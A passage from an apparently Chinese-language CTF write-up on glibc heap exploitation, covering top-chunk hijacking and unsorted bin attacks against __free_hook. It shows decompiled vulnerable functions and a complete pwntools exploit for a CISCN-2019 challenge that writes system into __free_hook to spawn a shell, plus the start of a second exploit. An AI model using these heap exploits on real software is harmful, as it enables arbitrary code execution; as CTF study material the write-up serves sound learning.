0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dd0│+0x0040: 0x0000000000000000</span><br><span class="line">0x00007ffff7dd0dd8│+0x0048: 0x0000000000000000</span><br></pre></td></tr></table></figure><p>这样就可以劫持top chunk，然后不断地malloc，直到往<code>__free_hook</code>写入<code>system</code>的地址，最后<code>free</code>一个写有”/bin/sh”的堆块就可以geshell了。</p><h3 id="举例-2"><a href="#举例-2" class="headerlink" title="举例"></a>举例</h3><h4 id="CISCN-2019-华东北赛区-Pwn-pwn4"><a href="#CISCN-2019-华东北赛区-Pwn-pwn4" class="headerlink" title="CISCN-2019-华东北赛区-Pwn-pwn4"></a>CISCN-2019-华东北赛区-Pwn-pwn4</h4><p><code>edit</code>功能的<code>getsize</code>提供了一个字节溢出，可以off by one造成chunk overlap从而造成uaf：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">    <span class="keyword">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"index: "</span>);</span><br><span class="line">    v2 = choice(v1);</span><br><span class="line">    v3 = v2;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v2 = *((_DWORD *)&amp;chunk_status + <span class="number">4</span> * v2);</span><br><span class="line">        <span class="keyword">if</span> ( v2 == <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">            v2 = choice(<span class="number">1</span>);</span><br><span class="line">            v4 = get_size(*((_DWORD *)&amp;chunk_size + <span class="number">4</span> * v3), v2);</span><br><span class="line">            <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"content: "</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2);</span><br><span class="line">                v2 = read_data(chunk_array[<span class="number">2</span> * v3], v4);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">get_size</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( a1 &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)a2 )</span><br><span class="line">        <span class="keyword">return</span> a2;</span><br><span class="line">    <span class="keyword">if</span> ( a2 - a1 == <span class="number">10</span> )</span><br><span class="line">        LODWORD(result) = a1 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        LODWORD(result) = a1;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>add</code>功能限制最大的内存分配空间是0x100，还有一个需要注意的点，<code>add</code>功能是用<code>calloc</code>来分配内存空间的，<code>calloc</code>分配内存会事先清空内存区域，同时<b>不会从tcache中取chunk</b>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">    <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">    <span class="keyword">void</span> *v4; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">signed</span> <span class="keyword">int</span>)i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        result = *((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)&amp;chunk_status + <span class="number">4</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="keyword">if</span> ( !(_DWORD)result )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"size: "</span>);</span><br><span class="line">        v3 = choice(v2);</span><br><span class="line">        <span class="keyword">if</span> ( v3 &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v3 &gt; <span class="number">4096</span> )</span><br><span class="line">            v3 = <span class="number">4096</span>;</span><br><span class="line">            v4 = <span class="built_in">calloc</span>(v3, <span class="number">1u</span>LL);</span><br><span class="line">            <span class="keyword">if</span> ( !v4 )</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">            *((_DWORD *)&amp;chunk_status + <span class="number">4</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = <span class="number">1</span>;</span><br><span class="line">            *((_DWORD *)&amp;chunk_size + <span class="number">4</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i) = v3;</span><br><span class="line">            chunk_array[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i] = v4;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"The lowbits of heap leak check : %x\n"</span>, chunk_array[<span class="number">2</span> * (<span class="keyword">signed</span> <span class="keyword">int</span>)i] &amp; <span class="number">0xFFF</span>LL);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"the index of ticket is %d \n"</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br>主要思路就是：</p><ol><li>其实题目没有给libc，这里之所以能知道有tcache是因为<code>add</code>给了chunk的低三个字节，可以明显看出在堆地址的开头是有分配0x250字节的tcache struct的。</li><li>事先分配释放7个<code>size=0x71</code>的chunk以填满tcache，之后才能将相应的chunk放入fastbin中实现fastbin attack。</li><li>再利用<code>edit</code>功能的off by one，形成chunk overlap，修改下一个chunk的size来创造unsorted bin从而leak libc地址。</li><li>利用chunk overlap形成uaf，实现fastbin attack将<code>main_arena</code>的<code>top</code>上方布置好size，注意我分配的空间是包含了<code>__malloc_hook</code>的，所以要保持其为<code>NULL</code></li><li>再利用fastbin attack改掉<code>top</code>为<code>__free_hook-0xb58</code>，因为不太清楚<code>main_arena</code>中其他结构体信息会不会造成其他位置影响，所以其他地方尽量保持不动</li><li>不断地申请释放空间（由于chunk的数量有限制），这里其实还是利用了<code>calloc</code>不会分配tcache的特性，注意一个tcache bin被填满后一定要换一个tcache bin，否则刚free出来的chunk会放进fastbin中，再次分配不会从top chunk切。</li><li>分配到<code>__free_hook</code>上方时，将<code>system</code>写入<code>__free_hook</code>，注意<code>__free_hook</code>上方有些位置不能写入内容（有待深入了解），因为在调试的过程中发现，若某些位置被填入数据会陷入<code>__lll_lock_wait_private</code>造成死锁状态，所以其他位置用”\x00”填充就好了。</li><li>之后<code>free</code>一个包含”/bin/sh”的chunk就能触发`system(“/bin/sh”)”了。<br>我的完整exp如下：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"The lowbits of heap leak check : "</span>)</span><br><span class="line">    <span class="keyword">return</span> p.recv(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    p.sendlineafter(<span class="string">"size: "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index, label=<span class="string">""</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"CHOICE: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"index: "</span>, str(index))</span><br><span class="line">    <span class="keyword">if</span> label != <span class="string">""</span>:</span><br><span class="line">        p.recvuntil(label)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"content: "</span>)</span><br><span class="line"></span><br><span class="line">unsorted_bin_offset = <span class="number">0x60</span></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">__malloc_hook_offset = <span class="number">0x3ebc30</span></span><br><span class="line">__free_hook_offset = <span class="number">0x3ed8e8</span></span><br><span class="line">realloc_offset = <span class="number">0x98c30</span></span><br><span class="line">system_offset = <span class="number">0x4f440</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    chunk = add(<span class="number">0x68</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">chunk_0 = add(<span class="number">0x58</span>)</span><br><span class="line">chunk_0 = int(chunk_0, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">chunk_1 = add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># unsorted bin</span></span><br><span class="line">chunk_2 = add(<span class="number">0xF8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite size</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0x58</span> + <span class="number">10</span>, <span class="string">"A"</span> * <span class="number">0x58</span> + <span class="string">"\x71"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create unsorted bin</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x50</span>, <span class="string">"A"</span> * <span class="number">0x40</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">chunk_1 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">"B"</span> * <span class="number">0x18</span> + p64(<span class="number">0x501</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leave enough space</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    chunk_3 = add(<span class="number">0xF8</span>)</span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free unsorted bin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">view(<span class="number">1</span>, p64(<span class="number">0x501</span>))</span><br><span class="line">main_arena = u64(p.recv(<span class="number">8</span>))</span><br><span class="line">libc_base = main_arena - unsorted_bin_offset - main_arena_offset</span><br><span class="line">__malloc_hook = libc_base + __malloc_hook_offset</span><br><span class="line">__free_hook = libc_base + __free_hook_offset</span><br><span class="line">libc_realloc = libc_base + realloc_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk_overlap + uaf</span></span><br><span class="line">chunk_2 = add(<span class="number">0x58</span>)</span><br><span class="line">chunk_3 = add(<span class="number">0x58</span>)</span><br><span class="line">chunk_4 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x58</span> + <span class="number">10</span>, <span class="string">"D"</span> * <span class="number">0x58</span> + <span class="string">"\x71"</span>)</span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">chunk_3 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x60</span>, <span class="string">"E"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>))</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x68</span>, <span class="string">"E"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">chunk_4 = add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create size area for malloc fastbin over main_arena-&gt;top_chunk</span></span><br><span class="line">chunk_5 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="number">0x33</span>, <span class="string">"F"</span> * <span class="number">0x13</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># uaf again</span></span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>, <span class="number">0x68</span>, <span class="string">"E"</span> * <span class="number">0x50</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook))</span><br><span class="line">chunk_4 = add(<span class="number">0x68</span>)</span><br><span class="line">chunk_6 = add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">0x68</span>, <span class="string">"\x00"</span> * <span class="number">0x60</span> + p64(__free_hook - <span class="number">0xb58</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># use unsorted bin</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    chunk_7 = add(<span class="number">0x100</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    chunk_7 = add(<span class="number">0xE8</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write __free_hook</span></span><br><span class="line">chunk_7 = add(<span class="number">0xE8</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"\x00"</span> * <span class="number">0x70</span> + p64(libc_system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger __free_hook</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">success(<span class="string">"main_arena: "</span> + hex(main_arena))</span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"__malloc_hook: "</span> + hex(__malloc_hook))</span><br><span class="line">success(<span class="string">"__free_hook: "</span> + hex(__free_hook))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ol><h2 id="unsorted-bin-attack-to-create-size-over-free-hook"><a href="#unsorted-bin-attack-to-create-size-over-free-hook" class="headerlink" title="unsorted bin attack to create size over __free_hook"></a>unsorted bin attack to create size over __free_hook</h2><p>同样是打<code>__free_hook</code>，只不过这次是用fastbin attack，通过unsorted bin attack在<code>__free_hook</code>上方伪造size提供给fastbin attack进行利用。</p><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>unsorted bin attack的攻击原理这里就不再二次赘述了，可参考<a href="https://n0nop.com/2020/04/09/pwn-heap-BookWriter/#unsorted-bin-attack" target="_blank" rel="noopener">BookWriter</a>。<br><br>只是有一点需要注意，由于进行了unsorted bin attack之后，还需要保持程序的正常运行进行后续利用，所以要保证不能再出现存取unsorted bin的情况（此时unsorted bin链表已经损坏），因此要保证进行unsorted bin attack时，<code>malloc</code>申请的大小要正好等于<code>unsorted bin</code>的大小，否则会有一个unsorted bin切割后重新入链的操作，从而使程序crash掉。<br><br>同时，若unsorted bin的size是伪造的，注意该size同样必须满足unsorted bin的size约束，否则同样会crash。</p><h3 id="举例-3"><a href="#举例-3" class="headerlink" title="举例"></a>举例</h3><h4 id="Secret-Of-My-Heart"><a href="#Secret-Of-My-Heart" class="headerlink" title="Secret Of My Heart"></a>Secret Of My Heart</h4><p><code>add</code>功能中<code>set_data</code>存在明显的off by null漏洞：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">    <span class="keyword">size_t</span> v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( i &gt; <span class="number">99</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Fulled !!"</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !*(_QWORD *)(chunk_array + <span class="number">0x30</span>LL * i + <span class="number">0x28</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Size of heart : "</span>);</span><br><span class="line">    v2 = (<span class="keyword">signed</span> <span class="keyword">int</span>)choice();</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0x100</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Too big !"</span>);</span><br><span class="line">    set_data((<span class="keyword">size_t</span> *)(chunk_array + <span class="number">48L</span>L * i), v2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Done !"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_BYTE *__<span class="function">fastcall <span class="title">set_data</span><span class="params">(<span class="keyword">size_t</span> *a1, <span class="keyword">size_t</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">    <span class="keyword">size_t</span> <span class="built_in">size</span>; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">    *a1 = a2;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name of heart :"</span>, a2);</span><br><span class="line">    read_data(a1 + <span class="number">1</span>, <span class="number">0x20</span>u);</span><br><span class="line">    a1[<span class="number">5</span>] = (<span class="keyword">size_t</span>)<span class="built_in">malloc</span>(<span class="built_in">size</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !a1[<span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Allocate Error !"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"secret of my heart :"</span>, <span class="number">32L</span>L);</span><br><span class="line">    result = (_BYTE *)(a1[<span class="number">5</span>] + (<span class="keyword">signed</span> <span class="keyword">int</span>)read_data((<span class="keyword">void</span> *)a1[<span class="number">5</span>], <span class="built_in">size</span>));</span><br><span class="line">    *result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要利用思路：</p><ol><li>利用<code>add</code>中的off by null，触发unsorted bin的unlink形成chunk overlap。</li><li>利用chunk overlap先leak出libc的地址。</li><li>通过unsorted bin attack将<code>__free_hook-0x50-0x10</code>处写入<code>main_arena</code>的地址。</li><li>将<code>__free_hook-0x50-0x10</code>处写入的<code>main_arena</code>的地址的高字节<code>0x7F</code>作为size，进行fastbin attack，将<code>system</code>写入<code>__free_hook</code>。</li><li>free一个包含”/bin/sh”的chunk，getshell（本地没打通，远程打通了，有点奇怪）。<br>我的exp：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, name, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size of heart : "</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Name of heart :"</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">"secret of my heart :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index, label)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index :"</span>, str(index))</span><br><span class="line">    p.recvuntil(label)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index :"</span>, str(index))</span><br><span class="line"></span><br><span class="line">unsorted_bin_offset = <span 